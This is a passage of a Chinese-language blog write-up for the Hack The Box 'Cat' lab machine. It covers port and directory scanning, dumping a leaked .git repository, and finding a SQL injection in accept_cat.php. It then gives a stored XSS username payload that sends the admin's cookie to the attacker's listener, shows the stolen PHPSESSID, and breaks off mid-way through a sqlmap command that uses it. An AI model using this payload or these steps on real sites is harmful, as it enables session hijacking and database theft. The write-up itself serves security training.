@@ -1,0 +1,880 @@
+
+
+<!DOCTYPE html><html lang="zh-CN" data-theme="light">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.1" theme-name="Stellar" theme-version="1.29.1">
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  
+  <title>XSS-and-Security-Labs：Hackthebox Cat Writeup - Rabbit's Blog</title>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-G3S2K79CLX"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-G3S2K79CLX');
+  </script>
+
+  
+    <meta name="description" content="靶机地址： https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Cat 一、信息收集与初步探测 1.1 Nmap 端口扫描 使用 Nmap 对目标 10.10.11.53 进行探测。  扫描结果显示，目标开放了 22 (SSH) 和 80 (HTTP) 端口，关注点在 Web 服务。 1.2 Web 服务探测 为了后续访问，要修改 &#x2F;etc&#x2F;hosts ，将 IP 地址映射到域">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox Cat Writeup">
+<meta property="og:url" content="https://askrabbit.cn/2025/05/10/Hackthebox%20Cat%20Writeup/">
+<meta property="og:site_name" content="Rabbit&#39;s Blog">
+<meta property="og:description" content="靶机地址： https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Cat 一、信息收集与初步探测 1.1 Nmap 端口扫描 使用 Nmap 对目标 10.10.11.53 进行探测。  扫描结果显示，目标开放了 22 (SSH) 和 80 (HTTP) 端口，关注点在 Web 服务。 1.2 Web 服务探测 为了后续访问，要修改 &#x2F;etc&#x2F;hosts ，将 IP 地址映射到域">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250420151339399.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510155155503.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250420153049868.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250420170257732.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250420170537892.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250426214250324.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250505150312573.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250505150247811.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250505150139676.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250505170604085.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250505185739716.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250506205902187.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250506214118921.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250506213928007.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250506222900287.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250506223044217.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250506223312577.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250506223421594.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510100935700.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510101421453.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510101105002.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510105003158.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510105802675.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510105738451.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510110102470.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510110158603.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510110452621.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510110701864.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510124054985.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510124708170.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510124820549.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510125431310.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510153041189.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510152524695.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510152838994.png">
+<meta property="article:published_time" content="2025-05-10T08:20:25.000Z">
+<meta property="article:modified_time" content="2025-05-10T08:20:25.000Z">
+<meta property="article:author" content="Rabbit">
+<meta property="article:tag" content="Hack The Box">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250420151339399.png">
+  
+  
+  
+  <meta name="keywords" content="编程, Web开发, 前端, 后端, JavaScript, Python, 个人成长, 生活, 思考, Rabbit, 安全, 读书, 微信读书, 女权">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.29.1">
+
+  
+    <link rel="shortcut icon" href="https://favorably-7690.oss-cn-beijing.aliyuncs.com/icon/%E5%85%94%E5%AD%90%20(2).png">
+  
+
+  
+
+  <link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/lxgw-wenkai-screen-webfont/1.6.0/lxgwwenkaiscreen.css"
+  media="all"
+/>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body>
+
+
+
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><div class="icon"><img no-lazy class="icon" src="/wiki/XSS-and-Security-Labs/logo-htb.svg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></div><a class="title" href="/wiki/XSS-and-Security-Labs/"><div class="main" ff="title">XSS-and-Security-Labs</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" data-filter="/wiki/XSS-and-Security-Labs/" placeholder="在文档中搜索..."></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item" title="主页" href="/"><span>主页</span></a><a class="nav-item active" title="探索" href="/wiki/"><span>探索</span></a></nav>
+</div>
+<div class="widgets">
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">Start</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/#start"><span class="toc-text">Web 安全靶场与 XSS 挑战文档</span></a></div><div class="widget-header dis-select"><span class="name">Hack The Box</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/index%20-%202"><span class="toc-text">Hack The Box (HTB)</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/Precious"><span class="toc-text">Precious — Hack The Box Machine</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/MonitorsTwo"><span class="toc-text">MonitorsTwo — Hack The Box Machine</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/Inject"><span class="toc-text">Inject — Hack The Box Machine</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/Busqueda"><span class="toc-text">Busqueda — Hack The Box Machine</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/Code"><span class="toc-text">Hackthebox 赛季靶场 Code Writeup：Python 代码编辑器漏洞利用到 Root 提权</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/Dog%20%E2%80%94%20Hack%20The%20Box"><span class="toc-text">Hackthebox 赛季靶场 Dog Writeup</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/Titanic"><span class="toc-text">Hackthebox 赛季靶场 Titanic Writeup</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/Hackthebox%20Cat%20Writeup"><span class="toc-text">Hackthebox Cat Writeup</span></a></div><div class="widget-header dis-select"><span class="name">XSS Games</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/Google%20XSS%20Game"><span class="toc-text">Google XSS Game</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/XSS%20Challenges"><span class="toc-text">XSS Challenges</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/xss-labs"><span class="toc-text">xss-labs</span></a></div><div class="widget-header dis-select"><span class="name">File upload Games</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/Upload-labs"><span class="toc-text">Upload-labs 靶场</span></a></div><div class="widget-header dis-select"><span class="name">SQL injection</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/sqli-labs"><span class="toc-text">sqli-labs 靶场（手工注入）</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/sqli-labs-SQLMap"><span class="toc-text">sqli-labs 靶场使用 SQLMap 注入（1-25 关）</span></a></div><div class="widget-header dis-select"><span class="name">Comprehensive shooting range</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/DVWA-master"><span class="toc-text">DVWA 靶场</span></a></div><div class="widget-header dis-select"><span class="name">Reproducible vulnerability</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/Reproducible%20vulnerability"><span class="toc-text">已知漏洞复现与验证</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/CyberPanel%20has%20a%20remote%20code%20execution%20(RCE)%20vulnerability"><span class="toc-text">【漏洞复现 - 241029】CyberPanel 存在远程代码执行（RCE）漏洞</span></a></div></widget>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/Zero-Yi7" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/08a41b181ce68.svg"/></a><a class="social" onclick="switchTheme()"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024"><path fill="currentColor" fill-rule="evenodd" d="M582.4 326.4c-140.8 0-256 115.2-256 256s115.2 256 256 256 256-115.2 256-256-115.2-256-256-256z m0 448c-70.4 0-131.2-36.8-164.8-92.8 12.8 3.2 27.2 4.8 40 4.8 121.6 0 219.2-99.2 219.2-219.2 0-17.6-1.6-35.2-6.4-52.8 60.8 32 102.4 96 102.4 169.6 1.6 104-84.8 190.4-190.4 190.4zM582.4 262.4c17.6 0 32-14.4 32-32v-128c0-17.6-14.4-32-32-32s-32 14.4-32 32v128c0 17.6 14.4 32 32 32zM262.4 582.4c0-17.6-14.4-32-32-32h-128c-17.6 0-32 14.4-32 32s14.4 32 32 32h128c17.6 0 32-14.4 32-32zM310.4 356.8c6.4 6.4 14.4 9.6 22.4 9.6 8 0 16-3.2 22.4-9.6 12.8-12.8 12.8-32 0-44.8l-91.2-91.2c-12.8-12.8-32-12.8-44.8 0-12.8 12.8-12.8 32 0 44.8l91.2 91.2zM944 220.8c-12.8-12.8-32-12.8-44.8 0l-91.2 91.2c-12.8 12.8-12.8 32 0 44.8 6.4 6.4 14.4 9.6 22.4 9.6 8 0 16-3.2 22.4-9.6l91.2-91.2c12.8-12.8 12.8-33.6 0-44.8zM310.4 808l-91.2 91.2c-12.8 12.8-12.8 32 0 44.8 6.4 6.4 14.4 9.6 22.4 9.6 8 0 16-3.2 22.4-9.6l91.2-91.2c12.8-12.8 12.8-32 0-44.8-11.2-11.2-32-11.2-44.8 0z"></path></svg></a></div></footer>
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" id="menu" href="/wiki">文档</a><span class="sep"></span><a class="cap breadcrumb" id="proj" href="/wiki/XSS-and-Security-Labs/">XSS-and-Security-Labs</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">更新于：<time datetime="2025-05-10T08:20:25.000Z">2025-05-10</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>Hackthebox Cat Writeup</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><p><strong>靶机地址：</strong> <a target="_blank" rel="noopener" href="https://app.hackthebox.com/machines/Cat">https://app.hackthebox.com/machines/Cat</a></p>
+<h3 id="一、信息收集与初步探测">一、信息收集与初步探测</h3>
+<h4 id="1-1-Nmap-端口扫描">1.1 Nmap 端口扫描</h4>
+<p>使用 Nmap 对目标 <code>10.10.11.53</code> 进行探测。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250420151339399.png" alt="image-20250420151339399"></p>
+<p>扫描结果显示，目标开放了 22 (SSH) 和 80 (HTTP) 端口，关注点在 Web 服务。</p>
+<h4 id="1-2-Web-服务探测">1.2 Web 服务探测</h4>
+<p>为了后续访问，要修改 <code>/etc/hosts</code> ，将 IP 地址映射到域名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.53  cat.htb</span><br></pre></td></tr></table></figure>
+<p>然后，在浏览器中访问 <code>http://cat.htb/</code>。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250510155155503.png" alt="image-20250510155155503"></p>
+<p>接下来，用 <code>dirsearch</code> 扫目录，看看是否有隐藏的路径或敏感文件泄露。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250420153049868.png" alt="image-20250420153049868"></p>
+<p>扫描结果中，<code>.git</code> 目录的泄露非常显眼。这意味着可以尝试下载网站的源代码。</p>
+<h3 id="二、漏洞利用与初始权限获取">二、漏洞利用与初始权限获取</h3>
+<h4 id="2-1-git-泄露与源码审计">2.1 .git 泄露与源码审计</h4>
+<p>使用 <code>GitHack</code> (或 <code>git-dumper</code>) 工具下载泄露的 <code>.git</code> 目录内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 GitHack.py http://cat.htb/.git/</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250420170257732.png" alt="image-20250420170257732"></p>
+<p>下载完成后，可以查看网站的目录结构和源代码：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250420170537892.png" alt="image-20250420170537892"></p>
+<p>在审计 PHP 源代码时，通常关注以下几点：</p>
+<blockquote>
+<ol>
+<li><strong>输入处理 (Input Handling):</strong> 应用程序如何接收来自用户的数据（例如 <code>$_GET</code>, <code>$_POST</code>, <code>$_FILES</code>）？</li>
+<li><strong>数据库交互 (Database Interaction):</strong> 数据是如何查询、插入、更新或删除的？是否一致地使用了预处理语句（Prepared Statements）？</li>
+<li><strong>认证与授权 (Authentication &amp; Authorization):</strong> 用户如何登录？如何控制对敏感区域（如管理页面）的访问？这些检查是否容易被绕过？</li>
+<li><strong>文件处理 (File Handling):</strong> 文件是如何上传、存储、访问或删除的？是否有对文件类型、大小和路径的检查？</li>
+<li><strong>会话管理 (Session Management):</strong> 会话是如何启动、管理和销毁的？</li>
+<li><strong>输出编码 (Output Encoding):</strong> 用户提供的数据在显示回 HTML 页面之前是否经过了适当的编码，以防止跨站脚本攻击（XSS）？</li>
+<li><strong>依赖与配置 (Dependencies &amp; Configuration):</strong> 是否有硬编码的秘密信息？是否暴露了敏感信息？</li>
+</ol>
+</blockquote>
+<p>审计 <code>accept_cat.php</code> 文件时，发现一处明显的 SQL 注入漏洞。代码行 <code>$sql_insert = &quot;INSERT INTO accepted_cats (name) VALUES ('$cat_name')&quot;;</code> 直接将来自 <code>$_POST['catName']</code> 的 <code>$cat_name</code> 变量拼接到 SQL 查询字符串中。</p>
+<p>同时，通过查看 <code>admin.php</code>，可以知道：</p>
+<ul>
+<li>存在一个名为 <code>axel</code> 的管理员用户。</li>
+<li>该页面<strong>只有用户名为 <code>axel</code> 的管理员</strong>才能访问。其他任何用户都会被重定向。</li>
+</ul>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250426214250324.png" alt="image-20250426214250324"></p>
+<h4 id="2-2-XSS-获取管理员-Cookie">2.2 XSS 获取管理员 Cookie</h4>
+<p>既然 <code>axel</code> 管理员会访问某些页面，可以尝试利用 XSS 窃取其 Cookie。网站有用户注册功能，用户名似乎没有做严格的过滤，这可能是 XSS 的注入点。</p>
+<p><strong>准备 XSS Payload:</strong></p>
+<p>当管理员浏览到包含这个 Payload 的内容时，其 Cookie 会被发送到监听的 HTTP 服务器。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&#x27;http://10.10.16.4:8888/?c=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>在攻击机上启动 HTTP 服务器监听：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8888</span><br></pre></td></tr></table></figure>
+<p><strong>注册包含 XSS Payload 的用户：</strong></p>
+<p>在网站的注册页面，将 XSS Payload 作为用户名进行注册：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Username:</th>
+<th style="text-align:left">Password:</th>
+<th style="text-align:left">Email:</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><code>&lt;script&gt;document.location='http://10.10.16.4:8888/?c='+document.cookie;&lt;/script&gt;</code></td>
+<td style="text-align:left">testpass</td>
+<td style="text-align:left"><a href="mailto:test@a.com">test@a.com</a></td>
+</tr>
+</tbody>
+</table>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250505150312573.png" alt="image-20250505150312573"></p>
+<p>提示 “Registration successful!” 后，登录该用户。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250505150247811.png" alt="image-20250505150247811"></p>
+<p>接下来，需要找到一个管理员会查看的页面来触发 XSS。<code>contest.php</code> 页面允许用户提交猫咪信息参加比赛，管理员很可能会审核这些提交。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250505150139676.png" alt="image-20250505150139676"></p>
+<p>提交一个猫咪信息。由于的用户名本身就是 XSS Payload，当管理员 (<code>axel</code>) 浏览到这个用户提交的信息时，XSS 就会触发。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250505170604085.png" alt="image-20250505170604085"></p>
+<p>很快，在的 HTTP 监听服务器上，收到了 Cookie：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20Cat%20Writeup/image-20250505185739716.png" alt="image-20250505185739716"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.53 - - [05/May/2025 17:05:07] &quot;GET /?c=PHPSESSID=bmq6r9up89ia29b3jflv331e7o HTTP/1.1&quot; 200 -</span><br></pre></td></tr></table></figure>
+<p>成功获取了 <code>axel</code> 管理员的 <code>PHPSESSID</code>。</p>
+<h4 id="2-3-利用-Cookie-进行-SQL-注入">2.3 利用 Cookie 进行 SQL 注入</h4>
+<p>现在拥有了 <code>axel</code> 的 Cookie，可以利用这个身份去访问之前发现的存在 SQL 注入漏洞的 <code>accept_cat.php</code> 脚本。</p>
+<p>使用 <code>sqlmap</code> 进行注入，目标是 dump 出 <code>users</code> 表的数据：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">python3 ./sqlmap.py -u <span class="string">&quot;http://cat.htb/accept_cat.php&quot;</span> \</span><br><span class="line">--data=<span class="string">&quot;catId=1&amp;catName=Misti&quot;</span> \</span><br><span class="line">--cookie=<span class="string">&quot;PHPSESSID=bmq6r9up89ia29b3jflv331e7o&quot;</span> 